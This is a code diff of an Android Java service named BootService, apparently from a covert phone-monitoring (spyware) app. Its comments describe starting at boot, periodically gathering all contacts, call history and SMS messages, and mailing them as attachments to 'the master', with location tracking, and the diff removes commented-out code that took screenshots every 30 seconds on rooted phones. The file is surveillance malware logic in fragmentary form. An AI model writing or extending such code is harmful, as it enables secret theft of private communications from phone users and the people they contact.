@@ -29,13 +29,10 @@ import android.util.Log;
 import android.view.KeyEvent;
 
 /**
- * Demo service that schedules a timer task
- * The timer task will execute the following tasks:
- *  - When starting the networks and over 24 hours to the previous timing, 
+ * Service schedules a timer to execute the following task:
+ *  - When starting the networks and over N days to the previous timing, 
  *    will get all contacts, phone call history and SMS, 
- *    saved as attachments and mail to the qualified receiver.
- *  - When staring the machine and network is connected, 
- *    get the 1st screenshot delayed 3 seconds and then do it in a 30 seconds circle.    
+ *    saved as attachments and mail to the master.  
  */
 public class BootService extends Service 
 {
@@ -47,11 +44,6 @@ public class BootService extends Service
 	private GetInfoTask mInfoTask;
 	private final long mGetInfoDelay  = 10000; // 10 Seconds
 	private final long mGetInfoPeriod = 300000; // 300 Seconds
-	
-	//private Timer mScreenshotTimer;
-	//private CaptureTask mCapTask;
-	//private final long mScreenshotDelay  = 3000;  // 3  Seconds
-	//private final long mScreenshotPeriod = 30000; // 30 Seconds
 	
 	public static LocationUtil locationUtil = null;
 	private TelephonyManager telManager;
@@ -180,9 +172,6 @@ public class BootService extends Service
 		
 		mGetInfoTimer = new Timer();
 		mInfoTask = new GetInfoTask(context);
-		
-		//mScreenshotTimer = new Timer();
-		//mCapTask = new CaptureTask(this);
 	}
 
 	@Override
@@ -221,14 +210,6 @@ public class BootService extends Service
 				locationUtil = new LocationUtil(context);
 			}
 		
-			//Start timer to capture screenshot
-			/*
-	        if (!SysUtils.isRooted(getApplicationContext())) {
-	        	Log.i(LOGTAG, "Not rooted");
-	        } else {
-	        	mScreenshotTimer.schedule(mCapTask, mScreenshotDelay, mScreenshotPeriod);
-	        }
-	        */
 		} 
 		
 		// If out of trial and not licensed, send a SMS to warn the receiver user
